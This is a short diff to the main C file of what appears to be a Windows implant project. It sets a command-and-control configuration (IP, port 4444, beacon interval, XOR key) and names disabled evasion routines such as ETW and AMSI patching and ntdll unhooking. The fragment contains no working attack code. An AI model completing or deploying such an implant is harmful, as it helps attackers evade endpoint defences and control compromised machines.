@@ -3,11 +3,12 @@
 #include "recon.h"
 #include "injection.h"
 #include "evasion.h"
+#include <winternl.h>
 
 int main(VOID)
 
 {
-	//doesn't do anything yet
+	//doesn't do anything yet and xor key wont live in process.
 	IMPLANT_CONFIG config = { "192.168.1.1", 4444, 60, "BASTILA", 0x42 };
 	//printf("CONFIG: %s %d %d %s %X\n", 
 	// config.c2ip, config.port, 
@@ -28,7 +29,7 @@ int main(VOID)
 	// EVASION
 	//EdrHookerCheck();
 	//EtwPatch();
-	//unhook_Ntdll();R
+	//unhook_Ntdll();
 	//AmsiPatch();	
 	
 	// SYSCALL TEST
@@ -66,10 +67,11 @@ int main(VOID)
 //}
 
 
-	WatchForTaskmgr();
 
 
 
+
+	//WatchForTaskmgr();
 
 
 
